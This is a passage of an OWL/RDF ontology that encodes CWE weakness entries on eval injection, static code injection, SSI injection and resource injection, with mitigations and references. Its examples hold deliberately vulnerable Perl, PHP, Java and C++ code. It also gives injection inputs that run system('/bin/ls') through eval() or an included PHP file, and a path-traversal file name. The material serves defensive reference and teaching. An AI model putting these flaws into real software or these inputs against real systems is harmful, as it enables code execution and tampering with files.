     Annotations: rdfs:comment "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The injected code could access restricted data / files."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The injected code could access restricted data / files."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
edit-config.pl: This CGI script is used to modify settings in a configuration file.

(bad code)
Example Language: Perl 
use CGI qw(:standard);

sub config_file_add_key {
my ($fname, $key, $arg) = @_;

# code to add a field/key to a file goes here
}

sub config_file_set_key {
my ($fname, $key, $arg) = @_;

# code to set key to a particular file goes here
}

sub config_file_delete_key {
my ($fname, $key, $arg) = @_;

# code to delete key from a particular file goes here
}

sub handleConfigAction {
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

# this is super-efficient code, especially if you have to invoke


# any one of dozens of different functions!

my $code = \"config_file_$action_key(\\$fname, \\$key, \\$val);\";
eval($code);
}

$configfile = \"/home/cwe/config.txt\";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print \"No action specified!\\n\";
}
The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:

(attack code)
 
add_key(\",\",\"); system(\"/bin/ls\");
This would produce the following string in handleConfigAction():

(result)
 
config_file_add_key(\",\",\"); system(\"/bin/ls\");
Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\$fname, \\$key, \\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If possible, refactor your code so that it does not need to use eval() at all."^^xsd:string, 
                 rdfs:comment "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.
Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     languages  "Java"^^xsd:string,
     languages  "JavaScript"^^xsd:string,
     languages  "PHP"^^xsd:string,
     languages  "Perl"^^xsd:string,
     languages  "Python"^^xsd:string,
     languages  "Ruby"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often the actions performed by injected control code are unlogged."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-96_Improper_Neutralization_of_Directives_in_Statically_Saved_Code

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Relationship:
\"HTML injection\" (see CWE-79: XSS) could be thought of as an example of this, but the code is injected and executed on the client side, not the server side. Server-Side Includes (SSI) are an example of direct static code injection."^^xsd:string,
        rdfs:comment "The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Perl code directly injected into CGI library file from parameters to another CGI program."^^xsd:string
                 
                 references  CVE-2002-0495,
     
     Annotations: rdfs:comment "PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script."^^xsd:string
                 
                 references  CVE-2003-0395,
     
     Annotations: rdfs:comment "Direct PHP code injection into supporting template file."^^xsd:string
                 
                 references  CVE-2005-1876,
     
     Annotations: rdfs:comment "Direct code injection into PHP script that can be accessed by attacker."^^xsd:string
                 
                 references  CVE-2005-1894,
     
     Annotations: rdfs:comment "chain: execution after redirect allows non-administrator to perform static code injection."^^xsd:string
                 
                 references  CVE-2007-6652,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     
     Annotations: rdfs:comment "User-Controlled Filename"^^xsd:string
                 
                 related_attack_patterns  CAPEC-73,
     
     Annotations: rdfs:comment "Manipulating User-Controlled Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-77,
     
     Annotations: rdfs:comment "Web Logs Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-81,
     
     Annotations: rdfs:comment "AJAX Fingerprinting"^^xsd:string
                 
                 related_attack_patterns  CAPEC-85,
     ID  "96"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Injected code can access resources that the attacker is directly prevented from accessing."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "This issue is most frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g. by byte-patching an executable), although it is highly unlikely."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     class  "Interpreted"^^xsd:string,
     
     Annotations: rdfs:comment "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The injected code could access restricted data / files."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The injected code could access restricted data / files."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. This example attempts to write user messages to a message file and allow users to view them.

(bad code)
Example Language: PHP 
$MessageFile = \"cwe-94/messages.out\";
if ($_GET[\"action\"] == \"NewMessage\") {
$name = $_GET[\"name\"];
$message = $_GET[\"message\"];
$handle = fopen($MessageFile, \"a+\");
fwrite($handle, \"<b>$name</b> says '$message'<hr>\\n\");
fclose($handle);
echo \"Message Saved!<p>\\n\";
}
else if ($_GET[\"action\"] == \"ViewMessages\") {
include($MessageFile);
}
While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:

(attack code)
 
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
which will decode to the following:

(attack code)
 
<?php system(\"/bin/ls -l\");?>
The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.

Notice that XSS (CWE-79) is also possible in this situation."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

Perform proper output validation and escaping to neutralize all code syntax from data written to code files."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     languages  "PHP"^^xsd:string,
     languages  "Perl"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often the actions performed by injected control code are unlogged."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-97_Improper_Neutralization_of_SSI_Within_a_Web_Page

    Annotations: 
        rdfs:comment "Relationship:
This can be resultant from XSS/HTML injection because the same special characters can be involved. However, this is server-side code execution, not client-side."^^xsd:string,
        rdfs:comment "The software generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Server Side Include (SSI) Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-101,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     ID  "97"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Utilize an appropriate mix of whitelist and blacklist parsing to filter server-side include syntax from all input."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-99_Improper_Control_of_Resource_Identifiers

    Annotations: 
        rdfs:comment "A resource injection issue occurs when the following two conditions are met:
 1. An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.
 2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.
This may enable an attacker to access or modify otherwise protected system resources."^^xsd:string,
        rdfs:comment "Alternate Terms:
Insecure Direct Object Reference:	
OWASP uses this term, although it is effectively the same as resource injection."^^xsd:string,
        rdfs:comment "Maintenance:
The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 \"Resource Injection,\" as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the \"identifier used to access a system resource\" such as a file name or port number, yet it explicitly states that the \"resource injection\" term does not apply to \"path manipulation,\" which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer."^^xsd:string,
        rdfs:comment "Other:
A resource injection issue occurs when the following two conditions are met:
1) An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.
2) By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.
Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in a separate category. See the path manipulation description for further details of this vulnerability."^^xsd:string,
        rdfs:comment "Relationship:
Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73)."^^xsd:string,
        rdfs:comment "The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Buffer Overflow via Environment Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-10,
     
     Annotations: rdfs:comment "Resource Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-240,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     ID  "99"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Modify Files or Directories"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.

(bad code)
Example Language: Java 
String rName = request.getParameter(\"reportName\");
File rFile = new File(\"/usr/local/apfr/reports/\" + rName);
...
rFile.delete();"^^xsd:string, 
                 rdfs:comment "Example 2. The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.

(bad code)
Example Language: C++ 
ifstream ifs(argv[0]);
string s;
ifs >> s;
cout << s;
The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name \"path manipulation.\") Similarly, data that contains URLs and URIs is risky for functions that create remote connections."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Modify Files or Directories"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     integrity  "Read Files or Directories"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
